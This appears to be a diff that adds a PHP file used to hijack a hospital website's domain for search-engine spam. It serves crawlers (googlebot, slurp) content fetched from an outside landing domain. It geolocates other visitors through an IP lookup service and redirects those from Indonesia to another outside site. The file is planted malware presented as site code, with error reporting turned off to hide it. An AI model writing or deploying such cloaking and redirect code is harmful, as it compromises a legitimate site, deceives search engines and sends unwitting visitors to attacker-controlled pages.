@@ -1,0 +1,105 @@
+<?php
+
+error_reporting(0);
+
+
+$http_referer = $_SERVER['HTTP_REFERER'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+
+$lan = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+
+
+function get_client_ip()
+{
+
+	$arr_ip_header = array(
+		'HTTP_CDN_SRC_IP',
+		'HTTP_PROXY_CLIENT_IP',
+		'HTTP_WL_PROXY_CLIENT_IP',
+		'HTTP_CLIENT_IP',
+		'HTTP_X_FORWARDED_FOR',
+		'REMOTE_ADDR',
+	);
+
+
+	$client_ip = 'unknown';
+
+
+	foreach ($arr_ip_header as $key)
+	{
+		if (!empty($_SERVER[$key]) && strtolower($_SERVER[$key]) != 'unknown')
+		{
+			$client_ip = $_SERVER[$key];
+			break;
+		}
+	}
+
+
+	return $client_ip;
+}
+
+
+$dy = array(
+        array(
+
+            'jiechizhizhu' => 'banfordgeneralhospital.com/',
+            
+
+            'zhizhufanhui' => 'https://homebaselanding.xyz/landing/banfordgeneralhospital/',
+
+
+            'jiechitiaozhuan' => 'banfordgeneralhospital.com/',
+
+
+            'tiaozhuan' => 'https://nelayankeramat.site/ilmu-belawan/banfordgeneralhospital/',
+        ),
+);
+
+
+$user_cl = get_client_ip();
+
+
+$uri = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+
+
+if (count($dy) > 0) {
+
+        $botchar = "/(googlebot|slurp|Google AdSense)/";
+        
+
+        if (preg_match($botchar, strtolower($user_agent))) {
+
+            foreach ($dy as $key => $val) {
+
+                if ($uri == $val['jiechizhizhu'] && !empty($val['zhizhufanhui'])) {
+
+					echo file_get_contents($val['zhizhufanhui']);exit;
+                }
+            }
+        } elseif (preg_match('/()/', strtolower($http_referer))) {    
+
+            foreach ($dy as $key => $val) {
+
+                if ($uri == $val['jiechitiaozhuan'] && !empty($val['tiaozhuan'])) {
+
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/$user_cl"); 
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+                    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
+                    $ipaddress = curl_exec($ch);
+                    curl_close($ch);
+
+
+                    $jsonArea = json_decode($ipaddress,true);
+
+
+                    if (!empty($jsonArea) && !empty($jsonArea['countryCode']) && strtolower($jsonArea['countryCode']) == 'id') {
+
+						header('Location: '.$val['tiaozhuan']);exit;
+                    }
+                }
+            }
+        }
+    }
+?>
